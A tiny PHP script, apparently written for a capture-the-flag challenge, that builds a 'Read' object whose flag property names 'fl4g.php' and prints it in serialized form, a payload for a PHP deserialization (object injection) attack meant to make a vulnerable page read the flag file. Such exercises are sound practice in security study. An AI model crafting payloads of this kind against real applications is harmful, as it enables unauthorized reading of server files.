<?php
class Read{
    public $flag;
}

$chambre = new Read();
$chambre -> flag = "fl4g.php";
echo serialize($chambre)
?>
